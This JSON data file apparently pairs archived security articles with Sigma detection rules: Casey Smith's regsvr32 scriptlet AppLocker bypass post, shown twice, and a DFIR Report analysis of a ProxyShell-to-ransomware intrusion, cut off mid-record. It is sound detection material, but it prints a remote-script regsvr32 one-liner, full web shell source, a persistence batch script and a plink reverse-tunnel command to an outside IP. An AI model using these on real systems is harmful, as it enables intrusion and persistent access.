\"unregister\" and... It worked.\n\nThat was it.\n\nThe amazing thing here is that regsvr32 is already proxy aware, uses TLS, follows redirects, etc... And... You guessed it, a signed, default MS binary. Whohoo.\n\nSo, all you need to do is host your .sct file at a location you control. From the target, simply execute:\n\n```\nregsvr32 /s /n /u /i:http://server/file.sct scrobj.dll\n```\n\nIt's not well documented that regsvr32.exe can accept a URL for a script.\n\nIn order to trigger this bypass, place the code block, either VB or JS, inside the `<registration>` element.\n\nHopefully, this makes sense.\n\nIn order to further prove this out, I wrote a PowerShell server to handle execution and return output.\n\nI hope this is helpful and that it makes sense.\n\nThere is A LOT more to explore here, so please, send me feedback if you find this helpful.\n\n**[Update]**\n\n- You can also call a local file too. If you really wanted to...\n- This does not ACTUALLY register the COM object. So nothing is in the registry... BONUS\n\nProof Of Concept Here\n\nSo, there you have it!\n\nAnd yes, this bypass fits in a Tweet. :-)\n\nAre we clear?\n\nCheers,\nCasey\n@subTee\n\n---\n\n**Posted by Casey Smith at 6:37 PM**",
    "sigma_rule": {
      "title": "Regsvr32 Execution From Potential Suspicious Location",
      "id": "9525dc73-0327-438c-8c04-13c0e037e9da",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of regsvr32 where the DLL is located in a potentially suspicious location.",
      "references": [
        "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
        "https://any.run/report/cf0de0c3ff0e337e47088e11c0867dda9709eaafa0a1c095c132e9b87722158e/34221348-072d-4b70-93f3-aa71f6ebecad/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\regsvr32.exe"
          },
          {
            "OriginalFileName": "REGSVR32.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Some installers might execute \"regsvr32\" with DLLs located in %TEMP% or in %PROGRAMDATA%. Apply additional filters if necessary."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_exec_path_1.yml",
    "id": "406"
  },
  {
    "url": "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
    "markdown": "# Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files)\n\n**Wednesday, April 26, 2017**\n\nSo, I have been working this out the last few days. I was trying to solve a particular problem.\n\nI needed a reverse shell on a workstation locked down by AppLocker executable and script rules enforced.\n\n**tl;dr**\n`regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll`\n\nI have been researching fileless persistence mechanisms. And it led me to a dark place. I would wish on no mortal. COM+.\n\nI posted earlier about .sct files. This link describes what they are. In short, they are XML documents that allow you to register COM objects that are backed not by a .dll but scripts.\nInside COM+\n\nHowever, I wasn't really happy with what I had found since it required Admin rights in order to execute. I could register the script to bypass AppLocker, but I still had to instantiate the object to trigger the code execution.\n\nThen, I decided to place the script block inside of the Registration tag. Bam! Now all I had to do was call the regsvr32 and the code would execute. Still... That whole admin problem...\n\nAfter pouring over hellish COM+ forums from 1999, I found a reference that stated that the code in the registration element executes on register and unregister.\n\nI logged in as a normal user and right-clicked the .sct file and chose \"unregister\" and... It worked.\n\nThat was it.\n\nThe amazing thing here is that regsvr32 is already proxy aware, uses TLS, follows redirects, etc... And... You guessed it, a signed, default MS binary. Whohoo.\n\nSo, all you need to do is host your .sct file at a location you control. From the target, simply execute:\n\n```\nregsvr32 /s /n /u /i:http://server/file.sct scrobj.dll\n```\n\nIt's not well documented that regsvr32.exe can accept a URL for a script.\n\nIn order to trigger this bypass, place the code block, either VB or JS, inside the `<registration>` element.\n\nHopefully, this makes sense.\n\nIn order to further prove this out, I wrote a PowerShell server to handle execution and return output.\n\nI hope this is helpful and that it makes sense.\n\nThere is A LOT more to explore here, so please, send me feedback if you find this helpful.\n\n**[Update]**\n\n- You can also call a local file too. If you really wanted to...\n- This does not ACTUALLY register the COM object. So nothing is in the registry... BONUS\n\nProof Of Concept Here\n\nSo, there you have it!\n\nAnd yes, this bypass fits in a Tweet. :-)\n\nAre we clear?\n\nCheers,\nCasey\n@subTee\n\n---\n\n**Posted by Casey Smith at 6:37 PM**",
    "sigma_rule": {
      "title": "Scripting/CommandLine Process Spawned Regsvr32",
      "id": "ab37a6ec-6068-432b-a64e-2c7bf95b1d22",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.",
      "references": [
        "https://web.archive.org/web/20171001085340/https://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html",
        "https://any.run/report/cf0de0c3ff0e337e47088e11c0867dda9709eaafa0a1c095c132e9b87722158e/34221348-072d-4b70-93f3-aa71f6ebecad/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell_ise.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\wscript.exe"
          ],
          "Image|endswith": "\\regsvr32.exe"
        },
        "filter_main_rpcproxy": {
          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
          "CommandLine|endswith": " /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate \".bat\", \".hta\", \".ps1\" or \".vbs\" scripts leverage legitimately often. Apply additional filter and exclusions as necessary",
        "Some legitimate Windows services"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_parent.yml",
    "id": "411"
  },
  {
    "url": "https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/",
    "markdown": "# Exchange Exploit Leads to Domain Wide Ransomware\n\n**Categories:**\nexploit\nFast Reverse Proxy\nPHOSPHORUS\nPlink\nProxyShell\nransomware\n\n**Published on:** November 15, 2021\n\nIn late September 2021, we observed an intrusion in which initial access was gained by the threat actor exploiting multiple vulnerabilities in Microsoft Exchange. The threat actors in this case were attributed to a group Microsoft tracks as PHOSPHORUS (possible overlap with UNC2448, NemesisKitten, and DEV-0270) which is suspected to be an Iranian nation state operator.\n\nProxyShell was used to deploy multiple web shells which lead to discovery actions, dumping of LSASS, use of Plink and Fast Reverse Proxy to proxy RDP connections into the environment. Furthermore, the actors encrypted systems domain wide, using BitLocker on servers and DiskCryptor on workstations, rather than affiliating with Ransomware as a Service (RaaS) programs or building an encryptor from scratch.\n\nProxyShell is a name given to a combination of three vulnerabilities: CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207. An attacker chaining the exploitation of these vulnerabilities could execute arbitrary code with SYSTEM privileges on Exchange servers. Here’s some more information on ProxyShell:\n- CISA Alert\n- NCSC Alert\n- Mandiant\n- Zero Day Initiative\n\nThe threat actors conducted this intrusion with almost no malware. It was a rare occurrence of a ransomware attack where Cobalt Strike was not used or any other C2 framework.\n\n## Services\n\n- **Private Threat Briefs:** Over 25 private reports annually, such as this one but more concise and quickly published post-intrusion.\n- **Threat Feed:** Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.\n- **All Intel:** Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.\n- **Private Sigma Ruleset:** Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&CK with test examples.\n- **DFIR Labs:** Offers cloud-based, hands-on learning experiences using real data from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.\n\nContact us today for a demo!\n\n## Case Summary\n\nWe observed an intrusion where an adversary exploited multiple Exchange vulnerabilities (ProxyShell) to drop multiple web shells. Over the course of three days, three different web shells were dropped in publicly accessible directories. These web shells, exposed to the internet, were used to execute arbitrary code on the Microsoft Exchange Server utilizing PowerShell and cmd.\n\nAfter gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like `ipconfig`, `net`, `ping`, `systeminfo`, and others, using the previously dropped web shells. This battery of initial discovery included a network call out to themoscowtimes[.]com. The threat actors repeated these tests twice over the first two days. On the third day, the next phase of the intrusion was underway.\n\nSince the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this and enabled a built-in account DefaultAccount, set the password and added it to Administrator and Remote Desktop Users groups. The threat actors then dropped Plink and established an SSH tunnel to expose RDP over the tunnel. They then connected to the Exchange server over RDP using the DefaultAccount account.\n\nThey then copied their tools into the environment via RDP, which was observed when CacheTask.zip was copied to disk. This compressed file had a few files in it:\n- CacheTask.bat\n- CacheTask.xml\n- dllhost.exe\n- install-proxy.bat\n- RuntimeBroker\n\nRight after the transfer, the adversaries executed install-proxy.bat to create two directories and move CacheTask.bat, dllhost.exe and RuntimeBroker into their respective folder. A scheduled task was created and executed, to execute install-proxy.bat, which established network persistence via Fast Reverse Proxy (FRP) which was used to proxy RDP traffic during the intrusion.\n\nUtilizing the Plink RDP connection, the threat actor dumped LSASS using Task Manager. Thirty minutes later, the threat actor started using a domain administrator account.\n\nUsing the stolen Domain Admin account, adversaries performed port scanning with KPortScan 3.0 and then moved laterally using RDP. Targeted servers included backup systems and domain controllers. The threat actor also deployed the FRP package to these systems after gaining access.\n\nFinally, the threat actors deployed setup.bat across the servers in the environment using RDP and then used an open source disk encryption utility to encrypt the workstations. Setup.bat ran commands to enable BitLocker encryption, which resulted in the hosts being inoperable.\n\nTo encrypt workstations, an open source utility called DiskCryptor was utilized. This was dropped on the workstations via RDP sessions and then executed to install the utility and setup the encryption. The utility required a reboot to install a kernel mode driver and then another reboot to lock out access to the workstations.\n\nThe time to ransom (TTR) of this intrusion, from the first successful ProxyShell exploitation to ransom, was around 42 hours. If the blue team failed to detect the intrusion up until the DefaultAccount being enabled, they would have had 8 hours to respond and evict the threat actors before being ransomed.\n\nThe threat actors left a ransom note requesting 8,000 USD to get the encryption keys for the systems.\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline illustrating the sequence of events related to a cyber attack that exploited vulnerabilities in Microsoft Exchange, leading to domain-wide ransomware. It spans three days and includes specific timestamps, actions taken by the attackers, and the tools used, such as ProxyShell exploitation, environment discovery, credential access, and lateral movement. Each entry provides a brief description of the action, highlighting key activities such as the execution of web shells, discovery commands, and the initiation of encryption, which culminates in the ransomware impact.\nTranscription: |\n  Exchange Exploit Leads to Domain Wide Ransomware\n  \n  Day 1\n  - 23:34 UTC Environment Discovery\n    - Execution of hostname, ipconfig, net user and other discovery commands\n  \n  Day 2\n  - 11:32 UTC Initial Access: ProxyShell exploitation on the Exchange server\n    - Webshell created: aspx.gtonvbgidah.aspx\n  - 11:33 UTC Second round of discovery command\n    - Execution of hostname, ipconfig, net user and other discovery commands mirroring the ones used the prior day\n  - 23:33 UTC Initial Access: ProxyShell exploitation on the Exchange server\n    - Web shells created: aspx.qdjqisafz.aspx AND login.aspx\n  \n  Day 3\n  - 09:41 UTC Persistence: Activation of DefaultAccount\n    - \"powershell.exe\" /c net user DefaultAccount %Password%\n    - \"powershell.exe\" /c net user DefaultAccount /active:yes\n  - 10:31 UTC Credentials Access: LSASS Dump\n    - lsass.DMP using taskmgr.exe and the creation of lsass.zip\n  - 10:28 UTC Execution: Port Forwarding using Plink\n    - plink.exe -N -T -R 0.0.0.0:12521:127.0.0.1:3389 148.251.71.182 -P 22 -f -v -pw Socks[1]23 -no-antispool\n  - 10:38 UTC Discovery: Port scanning\n    - SMB_LDAP and RDP scanning using KportScan3.exe\n  - 10:53 UTC Lateral Movement: RDP on the Domain Controller using the stolen domain admin account\n  - 17:28 UTC Lateral Movement on the Domain Controller using Impacket's WmiExec\n  - 17:34 UTC Impact: Encryption begins\n```\n\n## MITRE ATT&CK\n\n### Initial Access\n\nThis time we will talk about ProxyShell, which revealed itself around August 2021. Once again, the vulnerability affects Microsoft Exchange servers. Specifically, the on-prem versions identified as Exchange Server 2013, Exchange Server 2016 and Exchange Server 2019. It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (@orange_8361), includes a chain of 3 different CVEs:\n- CVE-2021-34473\n- CVE-2021-34523\n- CVE-2021-31207\n\nIn this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207). This last CVE allowed the creation of multiple web shells. The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:\n\n```\nGet-MailboxRegionalConfiguration\nGet-Mailbox\nGet-ExchangeServer\nGet-InboxRule\n```\n\nThis was shortly followed by the cmdlet `New-ManagementRoleAssignment` responsible for granting mailbox import/export privileges before running `New-MailboxExportRequest`. The cmdlet would export a Mailbox to a provided location with the .aspx extension. While the file is a legitimate .pst file, it contains plaintext web shell code that is rendered by IIS when requested.\n\nBelow is an example of one of the IPs who successfully exploited the vulnerabilities:\n\n```image\nAlt: Proxyshell\nDescription: The image displays a log table that captures data related to HTTP requests made to an Exchange server. It includes columns for Source IP, User Agent, URLs accessed, Action (POST), and Status code (200). The Source IP is shown as '198.144.189.74', indicating the origin of the requests. The User Agent suggests that the requests were made using a Python script utilizing the 'urllib' library. The URLs listed indicate various '/autodiscover/' endpoints being accessed, which are commonly exploited by attackers to enumerate configurations or vulnerabilities. The successful status code (200) indicates that the requests were processed correctly by the server.\nTranscription: |\n  | Source IP      | User Agent            | URLs                                                                                                                                                    | Action | Status |\n  | -------------- | --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- | ------ | ------ |\n  | 198.144.189.74 | python-urllib3/1.26.6 | /autodiscover/autodiscover.json?a=arpxe@vxkl1.py/autodiscover.xml&CorrelationID=<empty>; &cafeReqId=b2cab43c-c407-4d63-a5c5-                            | POST   | 200    |\n  |                |                       | /autodiscover/autodiscover.json?a=arpxe@vxkl1.py/mapi/emsmsdb&CorrelationID=<empty>; &cafeReqId=2958a2e8-1b18-452d-81eb-a2b2ba123785;                   |        |        |\n  |                |                       | /autodiscover/autodiscover.json?a=cdqis@mmgen.ujc/mapi/emsmsdb&CorrelationID=<empty>; &cafeReqId=f39b049-4dd5-49d9-bcc-cbb9127c7664;                    |        |        |\n  |                |                       | /autodiscover/autodiscover.json?a=cdqis@mmgen.ujc/autodiscover.xml&CorrelationID=<empty>; &cafeReqId=44d246d8-23e1-4085-bfbd-7b98074d825;               |        |        |\n  |                |                       | /autodiscover/autodiscover.json?a=cyqee@fmks.ryx/autodiscover.xml&CorrelationID=<empty>; &cafeReqId=c13c9621-52ba-4227-b9e9-c6eacce02db6;               |        |        |\n  |                |                       | /autodiscover/autodiscover.json?a=cyqee@fmks.ryx/mapi/emsmsdb&CorrelationID=<empty>; &cafeReqId=1bc05e4-9702-4083-93c7-3a62edc5ab5f;                    |        |        |\n  |                |                       | /autodiscover/autodiscover.json?a=mncqy@reccu.bkd/autodiscover/autodiscover.xml&CorrelationID=<empty>; &cafeReqId=604afb6b-3877-48a7-8fe1-945dd8961e89; |        |        |\n  |                |                       | /autodiscover/autodiscover.json?a=yntd@wocn1.ljc/mapi/emsmsdb&CorrelationID=<empty>; &cafeReqId=7ada18a-4829-481e-bde3-ea2ee2f9b119;                    |        |        |\n  |                |                       | /autodiscover/autodiscover.json?a=yntd@wocn1.ljc/autodiscover.xml&CorrelationID=<empty>; &cafeReqId=cfe630fb-463a-4dd5-ae70-7e2af54b4454;               |        |        |\n```\n\nThree web shells were spotted during our investigation:\n\n```image\nAlt: Initial Access\nDescription: The image displays a table showing an 'Initiating Process' log, detailing file creation events related to a cybersecurity incident involving Microsoft Exchange Server vulnerabilities. The columns include 'Line', 'Tag', 'Action Type', 'File Name', 'Folder Path', 'Initiating Process Account Domain', and 'Initiating Process Account Name'. The table lists three entries, indicating the creation of three files: 'aspx_qdajscizfzx.aspx', 'aspx_gtonvbgidhh.aspx', and 'login.aspx', with their respective folder paths and the 'system' account initiating the processes. This log provides insight into the actions taken by the attacker during the exploitation of the ProxyShell vulnerabilities.\nTranscription: |\n  | Line | Tag  | Action Type | File Name             | Folder Path                                                                | Initiating Process Account Domain | Initiating Process Account Name |\n  | ---- | ---- | ----------- | --------------------- | -------------------------------------------------------------------------- | --------------------------------- | ------------------------------- |\n  | =    |      |             |                       |                                                                            |                                   |                                 |\n  | 4887 | ✔   | FileCreated | aspx_qdajscizfzx.aspx | c:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth | nt authority                      | system                          |\n  | 4176 | ✔   | FileCreated | aspx_gtonvbgidhh.aspx | c:\\inetpub\\wwwroot\\aspnet_client                                           | nt authority                      | system                          |\n  | 4819 | ✔   | FileCreated | login.aspx            | c:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth | nt authority                      | system                          |\n```\n\n```image\nAlt: Web Shell Creation\nDescription: The image is a diagram illustrating the process of web shell creation following a successful exploitation of the ProxyShell vulnerability in Microsoft Exchange servers. It shows the relationship between the 'w3wp.exe' process and 'MSEchangeMailboxReplication.exe'. The diagram lists file paths where the web shells, 'login.aspx', 'aspx_qdajscizfzc.aspx', and 'aspx_gtonvbgidhh.aspx', are located, highlighting how these files are connected to the processes involved in their creation.\nTranscription: |\n  {\n    \"Web Shell Creation\": {\n      \"w3wp.exe\": {\n        \"Path\": \"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\ecp\\\\auth\\\\login.aspx\"\n      },\n      \"MSExchangeMailboxReplication.exe\": {\n        \"Path 1\": \"c:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\aspx_qdajscizfzx.aspx\",\n        \"Path 2\": \"c:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\aspx_gtonvbgidhh.aspx\"\n      }\n    }\n  }\n```\n\nThe `login.aspx` web shell is a simple web shell which takes a command and runs it using cmd.exe. We believe the threat actor used `aspx_qdajscizfzc.aspx` to upload `login.aspx` and that’s why the parent process is w3wp. Here’s what the web shell looked like:\n\n```image\nAlt: login.aspx\nDescription: The image depicts a web shell interface with fields for entering a program path and command-line arguments. The 'Program' field shows `c:\\\\windows\\system32\\cmd.exe`, indicating that the shell is set to execute commands via the Windows Command Prompt. The 'Arguments' field contains the command `/c whoami`, which is used to query the current user context in Windows. Below these fields, there is a button labeled 'Run', suggesting that the user can execute the command entered.\nTranscription: |\n  0, Q0,90,$1,£0,ŸU,–\n  \n  Program\n  c:\\windows\\system32\\cmd.exe\n  \n  Arguments\n  /c whoami\n  \n  [Run]\n```\n\nThis is the web shell code for `login.aspx`:\n\n```image\nAlt: login.aspx code\nDescription: The image displays a snippet of code from a web shell, specifically a script written in ASP.NET. It illustrates a simple command execution interface, allowing a user to input a command that will be executed on the server via 'cmd.exe'. The script includes elements such as a form with text boxes for defining the program path and arguments, along with a button to execute the command. The code also captures the output of the executed command and displays it back to the user.\nTranscription: |\n  html\n  <script runat='server'>\n  Sub RunCmd()\n      Dim myProcess As New Process()\n      Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)\n      myProcessStartInfo.UseShellExecute = false\n      myProcessStartInfo.RedirectStandardOutput = true\n      myProcess.StartInfo = myProcessStartInfo\n      myProcess.StartInfo.Arguments=xcmd.text\n      myProcess.Start()\n      Dim myStreamReader As StreamReader = myProcess.StandardOutput\n      Dim myString As String = myStreamReader.ReadToEnd()\n      myProcess.Close()\n      result.text= vbcrlf & mystring\n  End Sub\n  </script>\n  \n  <html>\n  <body>\n  <form runat='server'>\n  <p><asp:Label id='L_p' runat='server' width='80px'>Program</asp:Label>\n  <asp:TextBox id='xpath' runat='server' Width='300px'>c:\\windows\\system32\\cmd.exe</asp:TextBox>\n  </p>\n  <p><asp:Label id='L_a' runat='server' width='80px'>Arguments</asp:Label>\n  <asp:TextBox id='xcmd' runat='server' Width='300px' Text='/c whoami'></asp:TextBox>\n  </p>\n  <asp:Button id='Button' onclick='runCmd' runat='server' Width='100px' Text='Run'></asp:Button>\n  <asp:Label id='result' runat='server'></asp:Label>\n  </form>\n```\n\nThe other two web shells were dropped upon the successful exploitation of ProxyShell. Running `file` command on these two web shells, show that they are actually PST files that contain web shell:\n\n```\n$ file *\naspx_gtonvbgidhh.aspx: Microsoft Outlook email folder (>=2003)\naspx_qdajscizfzx.aspx: Microsoft Outlook email folder (>=2003)\n```\n\nThe first web shell, `aspx_qdajscizfzx.aspx`, can upload files and runs cmd.exe:\n\n```image\nAlt: aspx_qdajscizfzx.aspx\nDescription: The image displays a segment of code written in C#. The code defines a method named 'RunIt' that executes a command using 'cmd.exe'. It captures both the standard output and standard error from the command execution. The code uses a try-catch structure to handle potential exceptions that may occur during the process. The method returns the output of the command or any error message if an exception is raised. This image is relevant to the context of exploiting vulnerabilities in Microsoft Exchange servers, particularly in relation to running commands through web shells.\nTranscription: |\n  private string RunIt(string command)\n  {\n      string output = \"\";\n      string error = string.Empty;\n  \n      try\n      {\n          ProcessStartInfo info = new ProcessStartInfo();\n          info.FileName = \"cmd.exe\";\n          info.Arguments = \"/c \" + command;\n          info.RedirectStandardOutput = true;\n          info.RedirectStandardError = true;\n          info.UseShellExecute = false;\n  \n          Process process = Process.Start(info);\n          using (StreamReader streamReader = process.StandardOutput)\n          {\n              output = streamReader.ReadToEnd();\n          }\n          using (StreamReader streamReader = process.StandardError)\n          {\n              error = streamReader.ReadToEnd();\n          }\n      }\n      catch (Exception ex)\n      {\n          return ex.ToString();\n      }\n  }\n```\n\nThe second web shell, `aspx_gtonvbgidhh.aspx`, can upload files and runs powershell.exe:\n\n```image\nAlt: aspx_gtonvbgidhh.aspx\nDescription: The image displays a segment of code written in C#. The code defines a method named `RunIt` that is designed to execute PowerShell commands. It handles output and error streams from the executed command, capturing the results and any error messages. The structure includes a `try` block for processing the command execution and a `catch` block to handle potential exceptions. This code snippet relates to the ongoing discussion of web shell exploitation in the context of the ProxyShell vulnerability.\nTranscription: |\n  private string RunIt(string command)\n  {\n      string output = \"\";\n      string error = string.Empty;\n      try\n      {\n          ProcessStartInfo info = new ProcessStartInfo();\n          info.FileName = \"powershell.exe\";\n          info.Arguments = \"/c \" + command;\n          info.RedirectStandardOutput = true;\n          info.RedirectStandardError = true;\n          info.UseShellExecute = false;\n  \n          Process process = Process.Start(info);\n          using (StreamReader streamReader = process.StandardOutput)\n          {\n              output = streamReader.ReadToEnd();\n          }\n          using (StreamReader streamReader = process.StandardError)\n          {\n              error = streamReader.ReadToEnd();\n          }\n      }\n      catch (Exception ex)\n      {\n          return ex.ToString();\n      }\n  }\n```\n\n### Execution\n\nThe threat actors executed a script named `install-proxy.bat`, containing the following lines of code:\n\n```\n@echo off\ncd /D \"%~dp0\"\nmkdir C:\\ProgramData\\Microsoft\\Windows\\Runtime\\\nmkdir C:\\ProgramData\\Microsoft\\Windows\\DllHost\\\n\nmove /Y dllhost.exe C:\\ProgramData\\Microsoft\\Windows\\DllHost\\dllhost.exe\nmove /Y RuntimeBroker C:\\ProgramData\\Microsoft\\Windows\\Runtime\\RuntimeBroker\nmove /Y CacheTask.bat C:\\ProgramData\\Microsoft\\CacheTask.bat\n\nschtasks.exe /End /tn \"\\Microsoft\\Windows\\Maintenance\\CacheTask\"\nschtasks.exe /Delete /tn \"\\Microsoft\\Windows\\Maintenance\\CacheTask\"\nschtasks.exe /Create /XML CacheTask.xml /tn \"\\Microsoft\\Windows\\Maintenance\\CacheTask\"\nschtasks.exe /Run /tn \"\\Microsoft\\Windows\\Maintenance\\CacheTask\"\n\ndel /F CacheTask.xml\n\nstart /b \"\" cmd /c del \"%~f0\"&exit /b\n```\n\nThe script creates two directories, then moves files into their respective directories. It first stops and then deletes a task named CacheTask if it exists. It then Creates a schedule task which will call an XML file which then executes CacheTask.bat.\n\n```image\nAlt: CacheTask.bat\nDescription: |\n  The image shows a screenshot of a Notepad window displaying the contents of a file named `CacheTask.xml`. The XML file contains settings related to a scheduled task, including parameters such as `MultipleInstancesPolicy`, `DisallowStartIfOnBatteries`, and `ExecutionTimeLimit`. It specifically highlights the command that executes `CacheTask.bat`, which is located in `C:\n  ogramData\\Microsoft\\\nTranscription: |\n  <Settings>\n      <MultipleInstancesPolicy>StopExisting/MultipleInstancesPolicy</MultipleInstancesPolicy>\n      <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n      <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n      <AllowHardTerminate>true</AllowHardTerminate>\n      <StartWhenAvailable>true</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n          <StopOnIdle>true</StopOnIdle>\n          <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Enabled>false</Enabled>\n      <Hidden>false</Hidden>\n      <RunOnlyIfIdle>false</RunOnlyIfIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n      <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n      <Exec>\n          <Command>C:\\ProgramData\\Microsoft\\CacheTask.bat</Command>\n      </Exec>\n  </Actions>\n```\n\n`CacheTask.bat` is a script that loops the execution of the Fast Reverse Proxy (FRP) binary:\n\n```\n:loop\nC:\\ProgramData\\Microsoft\\Windows\\DllHost\\dllhost.exe\ngoto loop\n```\n\n```image\nAlt: dllhost.exe\nDescription: The image displays a detailed log of actions related to a cybersecurity incident, specifically focusing on the execution of a malicious script and its effects. It includes columns for Line Number, Action Type, Initiating Process Path, File Name, and Initiating Process Command Line. The log shows various actions such as 'FileCreated', 'ConnectionSuccess', and 'ProcessCreated', all attributed to 'dllhost.exe', indicating its role in the exploit. The actions suggest network connections and file manipulations associated with malicious activity, providing critical insights into the sequence of operations during the cyber attack.\nTranscription: |\n  | Line | Tag | Action Type                            | Initiating Process | Folder Path                               | File Name   | Initiating Process Command Line                     |\n  | ---- | --- | -------------------------------------- | ------------------ | ----------------------------------------- | ----------- | --------------------------------------------------- |\n  | 2647 |     | CommonFileNameDropSignerMismatch       | explorer.exe       | C:\\Users\\DefaultAccount\\Desktop\\CacheTask | dllhost.exe | Explorer.EXE                                        |\n  | 2648 |     | CommonFileNameDropSignerMismatch       | explorer.exe       | C:\\Users\\DefaultAccount\\Desktop\\CacheTask | dllhost.exe | Explorer.EXE                                        |\n  | 2649 |     | FileCreated                            | dllhost.exe        | C:\\Users\\DefaultAccount\\Desktop\\CacheTask | dllhost.exe | Explorer.EXE                                        |\n  | 2628 |     | ConnectionSuccess                      | dllhost.exe        | C:\\ProgramData\\Microsoft\\Windows\\DllHost  | dllhost.exe | dllhost.exe                                         |\n  | 2631 |     | ImageLoaded                            | dllhost.exe        | C:\\ProgramData\\Microsoft\\Windows\\DllHost  | dllhost.exe | dllhost.exe                                         |\n  | 2632 |     | ProcessCreated                         | cmd.exe            |                                           | dllhost.exe | cmd.exe /c \"C:\\ProgramData\\Microsoft\\CacheTask.bat\" |\n  | 2559 |     | OutboundConnectionToRdpProtocol        | dllhost.exe        | C:\\ProgramData\\Microsoft\\Windows\\DllHost  | dllhost.exe | dllhost.exe                                         |\n  | 2560 |     | ConnectionSuccess                      | dllhost.exe        | C:\\ProgramData\\Microsoft\\Windows\\DllHost  | dllhost.exe | dllhost.exe                                         |\n  | 2556 |     | OutboundConnectionToWebProtocol        | dllhost.exe        | C:\\ProgramData\\Microsoft\\Windows\\DllHost  | dllhost.exe | dllhost.exe                                         |\n  | 2557 |     | ConnectionSuccess                      | dllhost.exe        | C:\\ProgramData\\Microsoft\\Windows\\DllHost  | dllhost.exe | dllhost.exe                                         |\n  | 2558 |     | ProcessCommunicatedOverSmb             | dllhost.exe        | C:\\ProgramData\\Microsoft\\Windows\\DllHost  | dllhost.exe | dllhost.exe                                         |\n  | 2463 |     | OutboundConnectionToWebProtocol        | dllhost.exe        | C:\\ProgramData\\Microsoft\\Windows\\DllHost  | dllhost.exe | dllhost.exe                                         |\n  | 2374 |     | OutboundConnectionToUncommonlyUsedPort | dllhost.exe        | C:\\ProgramData\\Microsoft\\Windows\\DllHost  | dllhost.exe | dllhost.exe                                         |\n```\n\nBelow is a screenshot of `dllhost.exe` hash lookup in VirusTotal, matching Florian Roth’s Yara rule HKTL_PUA_FRP_FastReverseProxy_Oct21_1:\n\n```image\nAlt: Hash\nDescription: The image is a screenshot from VirusTotal showing the analysis of a file named 'dllhost.exe'. It indicates that 25 out of 68 security vendors flagged this file as malicious. The image contains details such as the file's hash, size (10.42 MB), and the date of detection (2021-10-24). Additionally, there are sections for detection, details, behavior, and 